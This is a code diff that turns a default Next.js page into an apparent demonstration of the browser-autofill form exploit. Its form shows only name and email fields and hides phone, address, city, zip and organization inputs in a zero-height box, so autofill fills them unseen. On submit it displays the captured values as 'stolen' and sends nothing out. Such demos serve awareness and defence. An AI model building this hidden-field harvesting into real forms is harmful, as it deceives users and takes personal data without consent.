@@ -1,82 +1,110 @@
 import Head from 'next/head'
+import { useState } from 'react'
+
+function FormRow({ name, data }) {
+  return (
+    <div className="text-xl">
+      <span className="font-bold">{name}:&nbsp;</span><span>{data}</span>
+    </div>
+  )
+}
 
 export default function Home() {
+  const [formdata, setFormdata] = useState({})
+  const [submitted, setSubmitted] = useState(false)
+
+  function updateFormdataFactory(name) {
+    return (e) => {
+      setFormdata(d => ({ ...d, [name]: e.target.value }))
+    }
+  }
+
+  function handleSubmit(e) {
+    e.preventDefault()
+    setSubmitted(true)
+  }
+
   return (
-    <div className="flex flex-col items-center justify-center min-h-screen py-2">
+    <>
       <Head>
-        <title>Create Next App</title>
+        <title>Advanced Form field exploit</title>
         <link rel="icon" href="/favicon.ico" />
       </Head>
+      <div className="mx-8">
+        <div class="max-w-prose mx-auto">
+          <form autocomplete="on" onSubmit={handleSubmit}>
+            <h2 className="font-bold text-pink-800 text-3xl pt-4">We would never steal your data.</h2>
 
-      <main className="flex flex-col items-center justify-center w-full flex-1 px-20 text-center">
-        <h1 className="text-6xl font-bold">
-          Welcome to{' '}
-          <a className="text-blue-600" href="https://nextjs.org">
-            Next.js!
-          </a>
-        </h1>
+            <input
+              type="text"
+              name="name"
+              id="name"
+              className="form-input rounded w-full p-4 mt-4 border-2 border-blue-500 text-blue-500"
+              placeholder="Full name"
+              autocomplete="name"
+              onChange={updateFormdataFactory('name')}
+            />
+            <input
+              type="email"
+              name="email"
+              id="email"
+              className="form-input rounded w-full p-4 mt-4 border-2 border-blue-500 text-blue-500"
+              placeholder="Email"
+              autocomplete="email"
+              onChange={updateFormdataFactory('email')}
+            />
+            <div className="h-0 overflow-hidden">
+              <input
+                type="text"
+                name="organization"
+                placeholder="organization"
+                autocomplete="organization"
+                onChange={updateFormdataFactory('organization')}
+              />
+              <input
+                type="text"
+                name="phone"
+                placeholder="Phone Number"
+                autocomplete="tel"
+                onChange={updateFormdataFactory('tel')}
+              />
+              <input
+                type="text"
+                name="address"
+                placeholder="Address"
+                autocomplete="address"
+                onChange={updateFormdataFactory('address')}
+              />
 
-        <p className="mt-3 text-2xl">
-          Get started by editing{' '}
-          <code className="p-3 font-mono text-lg bg-gray-100 rounded-md">
-            pages/index.js
-          </code>
-        </p>
+              <input
+                type="text"
+                name="city"
+                placeholder="City"
+                autocomplete="address-level2"
+                onChange={updateFormdataFactory('city')}
+              />
+              <input
+                type="text"
+                name="postal"
+                placeholder="Zip code"
+                autocomplete="postal-code"
+                onChange={updateFormdataFactory('zip')}
+              />
+            </div>
 
-        <div className="flex flex-wrap items-center justify-around max-w-4xl mt-6 sm:w-full">
-          <a
-            href="https://nextjs.org/docs"
-            className="p-6 mt-6 text-left border w-96 rounded-xl hover:text-blue-600 focus:text-blue-600"
-          >
-            <h3 className="text-2xl font-bold">Documentation &rarr;</h3>
-            <p className="mt-4 text-xl">
-              Find in-depth information about Next.js features and API.
-            </p>
-          </a>
+            <input
+              type="submit"
+              className="mt-4 bg-blue-500 text-white rounded p-4 border-2 border-blue-500 hover:bg-white hover:text-blue-500 cursor-pointer"
+              value="Submit"
+            />
+          </form>
 
-          <a
-            href="https://nextjs.org/learn"
-            className="p-6 mt-6 text-left border w-96 rounded-xl hover:text-blue-600 focus:text-blue-600"
-          >
-            <h3 className="text-2xl font-bold">Learn &rarr;</h3>
-            <p className="mt-4 text-xl">
-              Learn about Next.js in an interactive course with quizzes!
-            </p>
-          </a>
-
-          <a
-            href="https://github.com/vercel/next.js/tree/master/examples"
-            className="p-6 mt-6 text-left border w-96 rounded-xl hover:text-blue-600 focus:text-blue-600"
-          >
-            <h3 className="text-2xl font-bold">Examples &rarr;</h3>
-            <p className="mt-4 text-xl">
-              Discover and deploy boilerplate example Next.js projects.
-            </p>
-          </a>
-
-          <a
-            href="https://vercel.com/import?filter=next.js&utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-            className="p-6 mt-6 text-left border w-96 rounded-xl hover:text-blue-600 focus:text-blue-600"
-          >
-            <h3 className="text-2xl font-bold">Deploy &rarr;</h3>
-            <p className="mt-4 text-xl">
-              Instantly deploy your Next.js site to a public URL with Vercel.
-            </p>
-          </a>
+          {submitted && <div className="my-4 p-4 rounded-xl bg-red-200">
+            <h2 className="text-xl text-red-900 font-bold pb-4">Data that has been stolen:</h2>
+            {Object.entries(formdata).map(([key, value]) => <FormRow key={key} name={key} data={value} />)}
+          </div>}
         </div>
-      </main>
-
-      <footer className="flex items-center justify-center w-full h-24 border-t">
-        <a
-          className="flex items-center justify-center"
-          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Powered by{' '}
-          <img src="/vercel.svg" alt="Vercel Logo" className="h-4 ml-2" />
-        </a>
-      </footer>
-    </div>
+      </div>
+    </>
   )
 }
